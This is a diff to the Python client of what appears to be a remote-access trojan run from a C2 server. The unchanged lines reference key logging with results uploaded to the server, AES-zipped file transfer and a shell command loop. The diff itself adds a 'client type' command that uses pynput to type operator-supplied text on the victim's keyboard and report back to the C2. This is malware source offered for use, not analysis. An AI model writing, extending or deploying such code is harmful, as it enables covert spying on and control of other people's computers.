@@ -16,7 +16,7 @@ from time import time, sleep
 from subprocess import run, PIPE, STDOUT
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from pyperclip import paste, PyperclipWindowsException
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener, Controller
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
@@ -356,7 +356,22 @@ while True:
             post_to_server(f"[+]-Client => Key Logging is now Disabled on the client. Results Writen in Keys.log in the "
                            f"{clientPrint}\n[+]-Client => Use client upload Keys.log to get it on the C2 Server. \n")
 
+    # the 'client type TEXT' command allows us to Type some text on the Client's Keyboard
+    elif command.startswith("client type"):
+        keyboard = None
 
+        try:
+            # Split out the text and join it back together as a string, then type it
+            text = " ".join(command.split()[2:])
+            keyboard = Controller()
+            keyboard.type(text)
+            post_to_server(f"\n[+]-Client => Your message: \n{text} => was typed on the client\n")
+        except IndexError:
+            post_to_server("You must enter some text to type on the client. \n")
+        except keyboard.InvalidCharacterException:
+            post_to_server("A not-typeable Characters was Encountered. \n")
+
+    # Else, the wrong input, actually not a Built-in Command or Shell Command or Client/Server Commands
     else:
         post_to_server("Wrong/Unknown Input!!! Not a Built-in Command or Shell Command. try again... \n")
 
